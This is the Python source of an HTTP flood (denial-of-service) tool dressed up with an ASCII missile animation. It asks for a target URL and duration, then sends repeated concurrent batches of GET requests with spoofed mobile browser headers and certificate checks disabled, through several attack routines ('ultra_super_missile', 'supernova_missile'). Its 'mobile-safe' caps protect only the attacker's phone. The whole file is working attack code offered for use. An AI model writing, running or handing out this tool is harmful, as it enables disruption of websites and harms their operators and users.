import asyncio
import aiohttp
import random
import time
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Generate random real-looking IPv4
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Countdown loader with random IPs
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        for _ in range(3):  # Reduced from 5
            print(random_ip())
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m"
]

# SAFE batch sizes for mobile devices
MISSILE_BASE_SIZES = {
    1: 50,    # Light missile - safe for mobile
    2: 100,   # Medium missile
    3: 200,   # Heavy missile
    4: 300,   # Super missile
    5: 500    # Ultra missile - maximum safe for mobile
}

# Global request counter (lightweight)
total_requests = 0

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1, 2, 3, 4, 5])
        
        self.batch = MISSILE_BASE_SIZES.get(self.speed, 50)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(2, 5)  # Slower launches to reduce load
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles (simplified)
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    
    # Simple header
    buffer[0] = f"MOBILE MODE | REQUESTS: {total_requests}"
    buffer[1] = "=" * min(TERMINAL_WIDTH, 40)
    
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i + 2
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y + 2
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + missile.exhaust
    
    clear()
    # Only print visible lines to reduce CPU
    for line in buffer:
        if line.strip():
            print(line)

# Simple headers
def get_headers():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

# SAFE request function with limits
async def send_requests(target, batch):
    global total_requests
    
    # Mobile-safe connector with limits
    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)  # Reduced limits
    
    timeout = aiohttp.ClientTimeout(total=15)
    
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Process in smaller chunks for mobile safety
            CHUNK_SIZE = 25  # Small chunks to avoid memory issues
            successful = 0
            
            for chunk_start in range(0, batch, CHUNK_SIZE):
                chunk_end = min(chunk_start + CHUNK_SIZE, batch)
                chunk_size = chunk_end - chunk_start
                
                tasks = []
                for i in range(chunk_size):
                    try:
                        task = session.get(
                            target, 
                            headers=get_headers(),
                            allow_redirects=True, 
                            ssl=False
                        )
                        tasks.append(task)
                    except:
                        continue
                
                if tasks:
                    try:
                        responses = await asyncio.gather(*tasks, return_exceptions=True)
                        successful += sum(1 for r in responses if not isinstance(r, Exception))
                    except:
                        pass
                
                # Small delay between chunks to prevent overheating
                await asyncio.sleep(0.1)
            
            total_requests += successful
            return successful
            
    except Exception as e:
        return 0

# Mobile-safe continuous attacks
async def send_continuous_requests(target, missile):
    flight_time = (TERMINAL_HEIGHT + len(MISSILE_BODY)) / missile.speed * 0.1  # Slower
    
    start_time = time.time()
    requests_sent = 0
    
    while time.time() - start_time < flight_time and missile.active:
        # Mobile-safe batch sizes
        safe_batch = min(missile.batch, 100)
        successful = await send_requests(target, safe_batch)
        requests_sent += successful
        
        # Longer delays for mobile safety
        intervals = {1: 0.5, 2: 0.4, 3: 0.3, 4: 0.2, 5: 0.1}
        await asyncio.sleep(intervals[missile.speed])

# Mobile-safe special attacks
async def ultra_super_missile(target, duration):
    start_time = time.time()
    attack_count = 0
    max_attacks = duration // 10  # Limit total attacks
    
    while time.time() - start_time < duration and attack_count < max_attacks:
        await send_requests(target, 200)  # Safe batch size
        attack_count += 1
        await asyncio.sleep(10)  # Less frequent

async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        await send_requests(target, 50)  # Small batches
        await asyncio.sleep(2)  # Less frequent

async def supernova_missile(target, duration):
    start_time = time.time()
    supernova_count = 0
    max_supernovas = 3  # Very limited for mobile
    
    while time.time() - start_time < duration and supernova_count < max_supernovas:
        delay = random.uniform(15, 30)  # Much less frequent
        await asyncio.sleep(delay)
        
        await send_requests(target, 100)  # Small supernova
        supernova_count += 1

# Main loop - MOBILE SAFE
async def main():
    global total_requests
    
    print("=== MOBILE-SAFE MODE ===")
    print("Reduced load to prevent crashes")
    print("=" * 30)
    
    target = input("TARGET > ")
    duration = int(input("DURATION (seconds) > "))
    
    if duration > 300:  # Cap duration for mobile
        print("Duration capped at 300 seconds for mobile safety")
        duration = 300
    
    await countdown_loader(3)  # Shorter countdown

    # Only 2 missiles instead of 5 for mobile
    missiles = [Missile(1), Missile(3)]  # Light and heavy only
    
    # Start limited special attacks
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0] * len(missiles)
    
    # Reduced frame rate for mobile
    frame_count = 0

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                asyncio.create_task(send_continuous_requests(target, missile))
            
            missile.move()
        
        # Only draw every 3rd frame to reduce CPU
        frame_count += 1
        if frame_count % 3 == 0:
            draw_missiles(missiles)
            frame_count = 0
        
        # Longer sleep to reduce CPU usage
        await asyncio.sleep(0.2)

    print(f"\nAttack completed! Total requests: {total_requests}")

if __name__ == "__main__":
    try:
        # Set lower priority for mobile safety
        import os
        os.nice(10)  # Lower priority if available
        
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("Attack stopped by user")
    except Exception as e:
        print(f"Safe exit: {e}")
